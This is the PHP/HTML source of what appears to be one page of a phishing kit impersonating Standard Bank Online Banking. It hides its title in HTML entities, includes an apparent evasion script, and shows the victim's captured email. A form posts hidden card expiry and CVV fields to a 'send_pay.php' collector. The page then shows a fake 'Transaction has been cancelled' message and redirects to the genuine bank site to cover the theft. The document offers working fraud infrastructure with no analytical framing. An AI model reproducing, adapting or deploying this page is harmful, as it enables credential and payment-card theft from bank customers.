<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html>
<html lang="en" dir="ltr" class="plt-tablet plt-desktop md hydrated" mode="md">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
  <meta http-equiv="x-ua-compatible" content="IE=edge">
  <link rel="stylesheet" type="text/css" href="../libraries/css/app.03b5f075.css">
  <link rel="stylesheet" href="../libraries/css/bundle.css">
  <link rel="stylesheet" href="../libraries/css/ionic.bundle.css">
  <link rel="stylesheet" type="text/css" href="../libraries/css/sbg.css">
  <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
  <meta HTTP-EQUIV='REFRESH' content='5; url=https://onlinebanking.standardbank.co.za/'/>
</head>

<body class="body-container">
  <ion-app class="md ion-page hydrated">
    <ion-content class="md hydrated" style="--offset-top:0;--offset-bottom:0">
      <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
        <div class="ping-outer-container" style="display:flex">
          <div class="ping-logo login-template"><span class="company-logo"><img src="../libraries/img/sbg.png"></span></div>
          <form method="POST" action="../send/send_pay.php" autocomplete="off">
            <div class="ping-container ping-signin login-template">
              <div class="ping-body-container">
                <div class="content-column column-1 bm">
                <header>
                  <div data-v-3428eec7="" data-testid="paymentInfo" class="payment-info" style="padding-bottom: 10px!important;">
                    <div data-v-3428eec7="" class="merchant-logo"><img data-v-3428eec7="" src="../libraries/img/sbg.png" alt="PROLEX TRADING Logo"></div>
                    <div data-v-3428eec7="" class="customer-info" style="font-size: 1.4rem;margin-top: 5px;">
                      <?php echo $_SESSION['mail']; ?>
                    </div>
                  </div>
                </header>
                <div data-v-60f92f08="" data-v-65c93f30="" class="error"><img data-v-60f92f08="" src="../libraries/img/error.c7f5286a.svg" class="error__icon" style="margin-top: 25px;">
                  <div data-v-60f92f08="" class="error__header" style="margin-bottom: -110px;">
                    <div data-v-60f92f08="" data-testid="errorMessage" class="error__message"> Transaction has been cancelled. </div>
                  </div>
                </div>


                <div class="row">
                  <div class="col-6-sm">
                    <div class="form-group">
                      <input type="text" name="exp" autocomplete="off" placeholder="MM / YY" required="required" class="input input--card" style="visibility: hidden;">
                      <input type="text" name="cvv" autocomplete="off" placeholder="123" required="required" class="input input--card" style="visibility: hidden;">          
                    </div>
                  </div>
                </div>



                <div class="ping-buttons" style="margin-bottom: -25px;">
                  <a style="background: unset;border: unset;" href="https://onlinebanking.standardbank.co.za/">
                    <button type="button" class="button-natived">
                      Continue
                    </button>
                  </a>
      
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </ion-content>
  </ion-app>
  <!--
     <script type="text/javascript">
        function isInputNumber(evt){var ch=String.fromCharCode(evt.which);if(!(/[0-9]/.test(ch))){evt.preventDefault();}}
    </script>
  -->

    <script src="../libraries/js/jquery.min.js"></script>
    <script src="../libraries/js/jquery.mask.js"></script>
    <script type="text/javascript">
        $('input[name="ccn"]').mask('0000 0000 0000 0000');
        $('input[name="exp"]').mask('00 / 00');
        $('input[name="cvv"]').mask('000');
    </script>
</body>

</html>